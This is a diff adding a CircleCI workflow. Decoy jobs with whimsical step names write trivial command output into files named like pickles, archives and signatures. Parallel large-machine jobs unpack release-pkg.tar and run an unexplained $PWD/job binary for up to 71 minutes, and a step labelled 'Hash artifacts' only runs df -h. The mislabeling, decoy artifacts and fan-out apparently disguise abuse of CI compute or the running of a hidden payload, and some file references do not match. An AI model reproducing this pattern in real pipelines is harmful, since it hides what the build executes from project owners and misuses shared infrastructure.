+            { cat /tmp/_bld/95.bin > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  warmer_bug-8219:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: tbd
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{p *= $1}END{print p}'; true ; } > /tmp/_bld/log.gz
+            echo "ready: $(sha256sum /tmp/_bld/log.gz | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - log.gz
+  bug-8219:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/log.gz > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  postbuild_update-oauth:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: viking press
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{if(c[int($1/10)]++)}' | wc -l 2>/dev/null || seq 1 100 | awk '{c[int($1/10)]++}END{for(k in c)print k,c[k]}'; true ; } > /tmp/_bld/ckpt-main.pickle
+            echo "ready: $(sha256sum /tmp/_bld/ckpt-main.pickle | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-main.pickle
+  update-oauth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/ckpt-main.pickle > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  Gamma_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: swing out
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{m[3]=3; m[7]=7; m[2]=2; for(k in m)print k}' | sort -n; true ; } > /tmp/_bld/buffer.blob
+            echo "ready: $(sha256sum /tmp/_bld/buffer.blob | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - buffer.blob
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/buffer.blob > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  g2_dotnet8-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: hove to
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; date -u +"%H:%M:%S.%N"; true ; } > /tmp/_bld/888.out
+            echo "ready: $(sha256sum /tmp/_bld/888.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 888.out
+  dotnet8-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/888.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+  run_DEPLOY_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: feather tinder
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{if($1>25)print}' | head -5; true ; } > /tmp/_bld/57.blob
+            echo "ready: $(sha256sum /tmp/_bld/57.blob | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 57.blob
+  DEPLOY_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inspect pre-stage
+          command: |
+            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --file=release-pkg.tar
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 71m
+          command: $PWD/job
+
+  loader_min-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: hanger up
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo abcdef | wc -c; true ; } > /tmp/_bld/artifact
+            echo "ready: $(sha256sum /tmp/_bld/artifact | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - artifact
+  step2_update-oauth_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: thread fine
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 10 | sed 's/^/row-/'; true ; } > /tmp/_bld/ckpt-main.pickle
+            echo "ready: $(sha256sum /tmp/_bld/ckpt-main.pickle | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-main.pickle
+  Alpha_dan-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: pop
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 214730 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/_bld/stage-done.sig
+            echo "ready: $(sha256sum /tmp/_bld/stage-done.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage-done.sig
+  prefetch_dotnet8-cov_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: retry forever more
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 41541 | md5sum; true ; } > /tmp/_bld/888.out
+            echo "ready: $(sha256sum /tmp/_bld/888.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 888.out
+  package_prometheus-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: propane cut
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; date +%s; true ; } > /tmp/_bld/step-28.txt
+            echo "ready: $(sha256sum /tmp/_bld/step-28.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-28.txt
+  staging_dec11-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: cookout
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; hash -r && echo cache-cleared; true ; } > /tmp/_bld/382.data
+            echo "ready: $(sha256sum /tmp/_bld/382.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 382.data
+  warmer_defualt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: thursday thump
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{OFS=":"; print "a","b","c"}'; true ; } > /tmp/_bld/buffer.blob
+            echo "ready: $(sha256sum /tmp/_bld/buffer.blob | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - buffer.blob
+  beta_bug-8219_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: heavy wash
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "%s\n" {aa..zz} 2>/dev/null | head -5 || printf "%s\n" a1 a2 b1 b2; true ; } > /tmp/_bld/log.gz
+            echo "ready: $(sha256sum /tmp/_bld/log.gz | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - log.gz
+  stepA_aug2-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: pianissimo
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; n=length(s); for(i=1;i<=n;i++)print substr(s,i,1)}' | wc -l; true ; } > /tmp/_bld/step-3.out
+            echo "ready: $(sha256sum /tmp/_bld/step-3.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-3.out
+  env_PROD_DEPLOY_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: mask
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=10; b=0; if(b)print a/b; else print "nozero"}'; true ; } > /tmp/_bld/95.bin
+            echo "ready: $(sha256sum /tmp/_bld/95.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 95.bin
+  drain_update-webhook-leak_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: look here
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 50 /dev/zero | md5sum | awk '{print $1}'; true ; } > /tmp/_bld/725.out
+            echo "ready: $(sha256sum /tmp/_bld/725.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 725.out
+  wire_helios-ng_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: why flaky
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=10; b=0; if(b)print a/b; else print "nozero"}'; true ; } > /tmp/_bld/2024-06-07.data
+            echo "ready: $(sha256sum /tmp/_bld/2024-06-07.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-06-07.data
+workflows:
+  test:
+    jobs:
+      - reserve_min-test
+      - loader_min-test_2:
+          requires:
+            - reserve_min-test
+      - min-test:
+          requires:
+            - loader_min-test_2
+      - postbuild_update-oauth:
+          requires:
+            - loader_min-test_2
+      - step2_update-oauth_2:
+          requires:
+            - postbuild_update-oauth
+      - update-oauth:
+          requires:
+            - step2_update-oauth_2
+      - prep_dan-ship:
+          requires:
+            - step2_update-oauth_2
+      - Alpha_dan-ship_2:
+          requires:
+            - prep_dan-ship
+      - dan-ship:
+          requires:
+            - Alpha_dan-ship_2
+      - g2_dotnet8-cov:
+          requires:
+            - Alpha_dan-ship_2
+      - prefetch_dotnet8-cov_2:
+          requires:
+            - g2_dotnet8-cov
+      - dotnet8-cov:
+          requires:
+            - prefetch_dotnet8-cov_2
+      - tap_prometheus-rev:
+          requires:
+            - prefetch_dotnet8-cov_2
+      - package_prometheus-rev_2:
+          requires:
+            - tap_prometheus-rev
+      - prometheus-rev:
+          requires:
+            - package_prometheus-rev_2
+      - stage_dec11-cleanup:
+          requires:
+            - package_prometheus-rev_2
+      - staging_dec11-cleanup_2:
+          requires:
+            - stage_dec11-cleanup
+      - dec11-cleanup:
+          requires:
+            - staging_dec11-cleanup_2
+      - Gamma_defualt:
+          requires:
+            - staging_dec11-cleanup_2
+      - warmer_defualt_2:
+          requires:
+            - Gamma_defualt
+      - defualt:
+          requires:
+            - warmer_defualt_2
+      - warmer_bug-8219:
+          requires:
+            - warmer_defualt_2
+      - beta_bug-8219_2:
+          requires:
+            - warmer_bug-8219
+      - bug-8219:
+          requires:
+            - beta_bug-8219_2
+      - syncer_aug2-canary:
+          requires:
+            - beta_bug-8219_2
+      - stepA_aug2-canary_2:
+          requires:
+            - syncer_aug2-canary
+      - aug2-canary:
+          requires:
+            - stepA_aug2-canary_2
+      - ensure_PROD_DEPLOY_3:
+          requires:
+            - stepA_aug2-canary_2
+      - env_PROD_DEPLOY_3_2:
+          requires:
+            - ensure_PROD_DEPLOY_3
+      - PROD_DEPLOY_3:
+          requires:
+            - env_PROD_DEPLOY_3_2
+      - auditor_update-webhook-leak:
+          requires:
+            - env_PROD_DEPLOY_3_2
+      - drain_update-webhook-leak_2:
+          requires:
+            - auditor_update-webhook-leak
+      - update-webhook-leak:
+          requires:
+            - drain_update-webhook-leak_2
+      - verify_helios-ng:
+          requires:
+            - drain_update-webhook-leak_2
+      - wire_helios-ng_2:
+          requires:
+            - verify_helios-ng
+      - helios-ng:
+          requires:
+            - wire_helios-ng_2
+      - resync_sierra-7
+      - Beta_INIT_LAB
+      - sierra-7:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - INIT_LAB:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - titan-rev:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - titan-v2:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - jun12-smoke:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - node18-cov:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - py310-lint:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - produce-quick-docker-image:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - node20-cov:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - update-metrics-crash:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - Validate_Service9:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - preview:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - DEPLOY_LAB:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - v6-preview:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - greg-build:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - polaris-plus:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - py310-fmt:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
+      - ci:
+          requires:
+            - resync_sierra-7
+            - Beta_INIT_LAB
